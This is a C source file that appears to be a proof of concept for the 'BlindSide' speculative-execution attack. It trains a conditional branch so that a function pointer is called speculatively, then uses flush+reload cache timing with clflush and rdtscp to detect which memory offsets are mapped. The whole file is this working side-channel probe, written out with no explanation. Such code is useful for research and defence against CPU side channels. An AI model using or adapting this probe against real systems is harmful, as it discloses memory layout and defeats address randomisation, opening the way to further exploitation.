#include <stddef.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#define FORCE_INLINE __attribute__ ((always_inline)) static inline

#define RDTSCP_THRESH 50
#define NUM_TRIES 10000
#define N_OBJECTS 16
#define TARGET_OBJ N_OBJECTS-1
#define ACCESS_LOC 0x41414000
#define TARGET_FN_ADDRESS 0x42424000


FORCE_INLINE void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }
FORCE_INLINE void mfence() { asm volatile("mfence"); }
FORCE_INLINE int maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
FORCE_INLINE uint64_t rdtsc(void)
{
    uint64_t a, d;
    asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
    return a;
}


int flush_reload_t(void *ptr) {
  uint64_t start = 0, end = 0;

  start = rdtsc();
  maccess((void *) ptr);
  end = rdtsc();

  mfence();

  flush((void *) ptr);

  return (int)(end - start);
}




unsigned long loaded_data;

typedef struct blindside_obj_t {
  int fp_enabled;
  char fill2[64 - 0x8]; // cacheline alignement
  void (*fp)();
} blindside_obj_t;


__attribute__((naked))
void fn_testing(){
    maccess((void *)ACCESS_LOC);
    asm("ret");
}

__attribute__((naked))
void fn_training(){
    asm("ret");
}


void do_blindside(blindside_obj_t* obj) {

  flush(&obj->fp_enabled);
  mfence();
  if (obj->fp_enabled) {
      obj->fp();
  }
}



int main() {


    mmap((void *) ACCESS_LOC,  0x1000,  PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_FIXED| MAP_PRIVATE | MAP_POPULATE, -1, 0);
    mmap((void *) TARGET_FN_ADDRESS,  0x1000,  PROT_EXEC |PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_FIXED| MAP_PRIVATE | MAP_POPULATE, -1, 0);

  int tries, i, j;
  size_t x_tmp, x_fd, x_idx, x_spec_idx, x_train_idx, tmp, observed_ctx =0;

  memcpy((void *) TARGET_FN_ADDRESS, fn_testing, fn_training-fn_testing);

  blindside_obj_t objs[N_OBJECTS];

  for (i = 0 ; i < N_OBJECTS ; i++) {
      objs[i].fp_enabled=1;
      objs[i].fp = fn_training;
  }


  objs[TARGET_OBJ].fp_enabled=0;

  blindside_obj_t obj;
  for (j = -0x10000; j < 0x010000; j+=0x1000)
  {
      observed_ctx = 0;
      objs[TARGET_OBJ].fp = (void (*)())TARGET_FN_ADDRESS+j;

      int idx = 0;
      for (tries = NUM_TRIES; tries > 0; tries--) {

          flush((void *) ACCESS_LOC);

          //do_blindside( &objs[tries % N_OBJECTS]);
          do_blindside( &objs[idx++]);
          if (idx == N_OBJECTS) idx = 0;


          tmp = flush_reload_t((void * )ACCESS_LOC);
          if (tmp < RDTSCP_THRESH) observed_ctx++;
      }
      if (observed_ctx > 0 )
      printf("At 0x%x: Observed %d speculative data accesses!\n", j, observed_ctx);
  }
}
